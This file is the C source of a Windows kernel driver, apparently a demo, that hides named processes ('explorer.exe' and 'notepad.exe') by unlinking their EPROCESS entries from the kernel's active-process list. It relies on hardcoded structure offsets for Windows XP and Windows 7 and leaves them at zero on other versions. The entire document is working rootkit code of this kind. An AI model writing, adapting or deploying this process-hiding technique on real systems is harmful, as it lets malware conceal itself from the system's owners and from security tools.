

#ifndef CXX_HIDEPROCESS_H
#	include "HideProcess.h"
#endif

//dt _eprocess    0x88  0x174
//!process 0 0
//.cls

ULONG_PTR ActiveOffsetPre =  0;
ULONG_PTR ActiveOffsetNext = 0;
ULONG_PTR ImageName = 0; 
WIN_VERSION WinVersion = WINDOWS_UNKNOW;
NTSTATUS
DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegisterPath)
{


	DbgPrint("DriverEntry\r\n");

	DriverObject->DriverUnload = UnloadDriver;


	WinVersion = GetWindowsVersion();


    switch(WinVersion)
	{
	case WINDOWS_XP:   //32Bits
		{

			ActiveOffsetPre =  0x8c;
			ActiveOffsetNext = 0x88;
			ImageName = 0x174; 
			break;
		}

	case WINDOWS_7:   //64Bits 
		{
			ActiveOffsetPre =  0x190;
			ActiveOffsetNext = 0x188;
			ImageName = 0x2e0; 
			break;
		}
	}
	HideProcess("explorer.exe");
	HideProcess("notepad.exe");
	return STATUS_SUCCESS;

}

VOID HideProcess(char* ProcessName)
{
	PEPROCESS EProcessCurrent = NULL;
	PEPROCESS EProcessPre = NULL;
	PLIST_ENTRY Temp = NULL;





	EProcessCurrent = PsGetCurrentProcess();    //System  EProcess


	EProcessPre = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)EProcessCurrent+ActiveOffsetPre)))-ActiveOffsetNext);

	//DbgPrint("EProcessCurrent: 0x%p\r\n",EProcessCurrent);  

	//DbgPrint("EProcessNext: 0x%p\r\n",EProcessNext);  


	
	while (EProcessCurrent!=EProcessPre)
	{
	//	DbgPrint("%s\r\n",(char*)((ULONG_PTR)EProcessCurrent+ImageName));


		if(strcmp((char*)((ULONG_PTR)EProcessCurrent+ImageName),ProcessName)==0)
		{


			Temp = (PLIST_ENTRY)((ULONG_PTR)EProcessCurrent+ActiveOffsetNext);

			if (MmIsAddressValid(Temp))
			{
			//	Temp->Blink->Flink = Temp->Flink;
			//	Temp->Flink->Blink = Temp->Blink;   //数据结构


				RemoveEntryList(Temp);

				
			}
		

			break;
		}
		
		EProcessCurrent = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)EProcessCurrent+ActiveOffsetNext)))-ActiveOffsetNext);


	}
}

VOID UnloadDriver(PDRIVER_OBJECT  DriverObject)
{
	DbgPrint("UnloadDriver\r\n");
}







WIN_VERSION GetWindowsVersion()
{
	RTL_OSVERSIONINFOEXW osverInfo = {sizeof(osverInfo)}; 
	pfnRtlGetVersion RtlGetVersion = NULL;
	WIN_VERSION WinVersion;
	WCHAR wzRtlGetVersion[] = L"RtlGetVersion";

	RtlGetVersion = GetFunctionAddressByName(wzRtlGetVersion);    //Ntoskrnl.exe  导出表
	if (RtlGetVersion)
	{
		RtlGetVersion((PRTL_OSVERSIONINFOW)&osverInfo); 
	} 
	else 
	{
		PsGetVersion(&osverInfo.dwMajorVersion, &osverInfo.dwMinorVersion, &osverInfo.dwBuildNumber, NULL);   //Documet
	}

	DbgPrint("Build Number: %d\r\n", osverInfo.dwBuildNumber);

	if (osverInfo.dwMajorVersion == 5 && osverInfo.dwMinorVersion == 1) 
	{
		DbgPrint("WINDOWS_XP\r\n");
		WinVersion = WINDOWS_XP;
	}
	else if (osverInfo.dwMajorVersion == 6 && osverInfo.dwMinorVersion == 1)
	{
		DbgPrint("WINDOWS 7\r\n");
		WinVersion = WINDOWS_7;
	}
	else if (osverInfo.dwMajorVersion == 6 && 
		osverInfo.dwMinorVersion == 2 &&
		osverInfo.dwBuildNumber == 9200)
	{
		DbgPrint("WINDOWS 8\r\n");
		WinVersion = WINDOWS_8;
	}
	else if (osverInfo.dwMajorVersion == 6 && 
		osverInfo.dwMinorVersion == 3 && 
		osverInfo.dwBuildNumber == 9600)
	{
		DbgPrint("WINDOWS 8.1\r\n");
		WinVersion = WINDOWS_8_1;
	}
	else
	{
		DbgPrint("WINDOWS_UNKNOW\r\n");
		WinVersion = WINDOWS_UNKNOW;
	}

	return WinVersion;
}


PVOID 
GetFunctionAddressByName(WCHAR *wzFunction)
{
	UNICODE_STRING uniFunction;  
	PVOID AddrBase = NULL;

	if (wzFunction && wcslen(wzFunction) > 0)
	{
		RtlInitUnicodeString(&uniFunction, wzFunction);      //常量指针
		AddrBase = MmGetSystemRoutineAddress(&uniFunction);  //在System 进程  第一个模块  Ntosknrl.exe  ExportTable
	}

	return AddrBase;
}

